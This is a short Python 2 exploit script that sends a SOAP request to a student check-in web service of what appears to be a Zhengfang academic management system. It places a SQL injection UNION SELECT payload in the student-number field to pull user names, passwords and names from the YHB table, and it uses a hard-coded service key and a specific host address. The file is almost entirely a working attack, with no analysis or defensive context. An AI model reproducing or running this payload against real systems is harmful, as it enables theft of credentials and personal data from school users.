import os
import re
import sys
import urllib2
import httplib
import random
import time
import string
import requests
from bs4 import BeautifulSoup


def SendRtx(payload, xnxq, strKey):
    SENDTPL = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 				xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">%s</xh>
      <xnxq xsi:type="xsd:string">%s</xnxq>
      <strKey xsi:type="xsd:string">%s</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>'''
    SoapMessage = SENDTPL % (payload, xnxq, strKey)
    webservice = httplib.HTTP("xxx.xxx.xxx.xxx")
    webservice.putrequest("POST", "/service.asmx HTTP/1.1")
    webservice.putheader("Host", "202.121.168.25")
    webservice.putheader("Content-type", "text/xml; charset=utf-8")
    webservice.putheader("Content-length", "%d" % len(SoapMessage))
    webservice.putheader("SOAPAction", "\"http://www.zf_webservice.com/GetStuCheckinInfo \"")
    webservice.endheaders()
    webservice.send(SoapMessage)
    # get the response
    statuscode, statusmessage, header = webservice.getreply()
    return statuscode, statusmessage, header


if __name__ == '__main__':
    payload = "222222' union select YHM,KL,XM,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from YHB where 'a'='a"
    xnxq = "2013-2014-1"
    strKey = "KKKGZ2312"
    print(SendRtx(payload, xnxq, strKey))